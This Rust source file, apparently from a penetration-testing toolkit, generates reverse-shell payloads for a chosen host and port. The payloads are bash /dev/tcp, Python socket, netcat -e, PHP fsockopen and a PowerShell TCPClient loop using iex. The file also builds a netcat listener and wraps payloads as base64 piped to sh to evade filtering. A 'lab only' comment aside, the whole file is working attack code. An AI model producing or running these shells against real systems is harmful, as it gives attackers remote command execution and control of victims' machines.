use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Shell {
  pub name: String,
  pub code: String,
  pub listener: String,
}

// Lab only templates. Caller must respect scope. No auto listen.
pub fn generate(kind: &str, lhost: &str, lport: u16) -> Shell {
  let listener = format!("nc -lvnp {lport}");
  let code = match kind {
    "bash" => format!("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
    "python3" => format!("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "nc" => format!("nc -e /bin/sh {lhost} {lport}"),
    "php" => format!("php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "powershell" => format!("powershell -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}}\""),
    _ => format!("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
  };
  Shell { name: kind.into(), code, listener }
}

pub fn encode_base64(s: &str) -> String {
  use base64::Engine as E;
  E::encode(&base64::engine::general_purpose::STANDARD, s.as_bytes())
}

// Encode a generated shell for transport. none keeps raw,
// base64 wraps with a decode pipe, url uses percent encoding.
pub fn encode_shell(code: &str, how: &str) -> String {
  match how {
    "base64" => {
      let b64 = encode_base64(code);
      format!("echo {b64} | base64 -d | sh")
    }
    "url" => crate::codec::url_encode(code),
    _ => code.to_string(),
  }
}
